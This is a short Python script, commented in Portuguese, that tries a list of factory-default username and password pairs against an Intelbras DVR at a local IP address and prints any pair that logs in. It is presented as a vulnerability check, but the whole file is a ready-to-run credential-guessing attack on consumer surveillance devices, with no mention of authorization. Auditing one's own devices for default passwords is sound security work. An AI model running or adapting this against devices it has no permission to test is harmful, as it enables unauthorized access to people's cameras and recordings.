import requests

url = "http://192.168.4.9" # Endpoint comum de autenticação Intelbras API

# Combinações padrão comuns de fábrica da Intelbras
credenciais_padrao = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", "") # Senha em branco (comum em modelos antigos após reset)
]

def testar_dvr(usuario, senha):
    # Parâmetros padrão de autenticação baseados no protocolo HTTP do dispositivo
    params = {"username": usuario, "password": senha}
    try:
        response = requests.get(url, params=params, timeout=3)
        
        # Se retornar código 200 e indicar sucesso na string de resposta
        if response.status_code == 200 and "status=true" in response.text.lower():
            print(f"[VULNERABILIDADE CRÍTICA] DVR Intelbras exposto! Login: {usuario} | Senha: {senha}")
            return True
        print(f"[SEGURO] Tentativa falhou para {usuario}:{senha}")
    except Exception as e:
        print(f"[ERRO] Falha ao conectar ao DVR: {e}")
    return False

print("Iniciando teste de credenciais no DVR Intelbras...")
for u, s in credenciais_padrao:
    if testar_dvr(u, s):
        break
print("Varredura encerrada.")
